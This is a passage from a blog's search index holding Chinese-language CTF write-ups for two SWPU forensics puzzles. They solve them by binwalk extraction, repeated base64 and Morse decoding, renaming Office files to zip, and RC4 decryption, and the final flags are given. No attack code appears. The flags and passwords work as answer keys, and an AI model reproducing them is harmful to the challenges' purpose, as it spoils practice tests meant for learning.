id="swpu-2019神奇的二维码"><a class="markdownIt-Anchor" href="#swpu-2019神奇的二维码"></a> [SWPU 2019]神奇的二维码</h3><p>附件是一张二维码</p><img src="/2023/01/04/NSSCTFwp/MISC-%E7%A5%9E%E5%A5%87%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81-BitcoinPay.png" class=""><p>扫描后swpuctf{flag_is_not_here}是假的flag</p><p>放到虚拟机binwalk一下</p><img src="/2023/01/04/NSSCTFwp/binwalk.png" class=""><p>发现有很多压缩包</p><p><code>binwalk -e MISC-神奇的二维码-BitcoinPay.png</code>分解出来</p><p>里面有一个flag.doc是一堆base64编码</p><p>通过20次base64解码</p><p>得到<code>comEON_YOuAreSOSoS0great</code>,这是打开18394.rar里面音频的密码</p><p>音频打开后是一段莫斯密码</p><p>用Au打开，手动解码</p><img src="/2023/01/04/NSSCTFwp/morse.png" class=""><p>长的为<code>-</code>，短的为<code>.</code>，空的用<code>/</code>分隔</p><p>得到<code>--/---/.-./..././../.../...-/./.-./-.--/...-/./.-./-.--/./.-/.../-.--/</code></p><p>在线解码得到<code>MORSEISVERYVERYEASY</code>,用Python<code>&quot;MORSEISVERYVERYEASY&quot;.lower()</code>转小写</p><p><code>NSSCTF&#123;morseisveryveryeasy&#125;</code></p><h3 id="swpu-2020套娃"><a class="markdownIt-Anchor" href="#swpu-2020套娃"></a> [SWPU 2020]套娃</h3><p>附件下下来，得到打不开的swpu.xlsx和RC4data.txt</p><p>Office文件的本质都是一个zip压缩包</p><p>改后缀为zip,打开swpu.zip</p><p>又得到两个.xlsx文件：RC4key.xlsx,esayrc4.xlsx</p><p>都改为zip，发现只有RC4key.zip可以打开，esayrc4.zip打不开</p><p>RC4key.zip打开为一个加密的RC4key.txt</p><p>将esayrc4.xlsx放到WinHex里面在最下面发现密码<code>password:6e4c834d77cba03af41e1562a5bce84e</code>,</p><p>解压RC4key.zip得到<code>ABCDEFGHIJKLMNOPQRSTUVWXYZ</code>,</p><p>结合RC4data.txt 在线RC4解密得到ef1a73d40977a49b99b871980f355757</p><p><code>NSSCTF&#123;ef1a73d40977a49b99b871980f355757&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
